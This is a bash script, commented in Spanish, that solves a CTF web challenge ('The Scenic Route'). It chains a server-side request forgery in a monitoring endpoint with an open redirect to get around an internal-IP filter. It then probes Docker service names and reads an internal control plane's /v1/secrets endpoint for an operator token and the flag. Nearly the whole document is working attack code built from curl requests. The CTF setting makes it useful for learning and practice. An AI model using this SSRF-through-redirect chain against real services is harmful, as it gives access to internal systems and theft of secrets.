#!/bin/bash
# The Scenic Route (Fluid Attacks CTF 2026, Web) -- SSRF con filtro de IP interna bypasseado por
# open-redirect + descubrimiento de servicios internos (Docker).
# Uso:    ./scenic_route_ssrf.sh <base_url> <probe_endpoint> <redirect_endpoint>
# Ejemplo: ./scenic_route_ssrf.sh https://<host>.chal.ctf.ae /monitor /go
#
# El probe server-side rechaza IPs internas al enviar directo; el open-redirect /go?next= (servicio
# de attribution) lo bypassa: el probe sigue el 302 sin re-validar. Interpretar estados:
#   connection refused = cerrado-alcanzable | timeout = firewall/instancia-expirando
#   Name or service not known = DNS-fail    | Network unreachable = sin egress
# Control plane hallado en app.js: 127.0.0.1:9101 /v1/monitors -> /v1/secrets -> operator_token.

BASE="${1:?base_url}"
PROBE="${2:-/monitor}"
REDIR="${3:-/go}"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

send_probe(){  # $1 = url a monitorear
  curl -sk -A "$UA" -G "$BASE$PROBE" --data-urlencode "url=$1"
}
via_redirect(){ send_probe "$BASE$REDIR?next=$1"; }

echo "[*] 0) baseline: directo a localhost (deberia rechazar por filtro)"
send_probe "http://127.0.0.1:80/"; echo

echo "[*] 1) bypass via open-redirect a localhost:80 (refused = alcanzado)"
via_redirect "http://127.0.0.1:80/"; echo

echo "[*] 2) descubrir servicios Docker por nombre (el que RESUELVE vs 'Name or service not known')"
for name in web api app redis db backend control-plane; do
  printf '   %-14s -> ' "$name"; via_redirect "http://$name:9101/v1"; echo
done

echo "[*] 3) leer el control plane (ajustar host/puerto al que respondio)"
via_redirect "http://127.0.0.1:9101/v1";         echo
via_redirect "http://127.0.0.1:9101/v1/secrets";  echo
#   -> operator_token / FLAG{...}
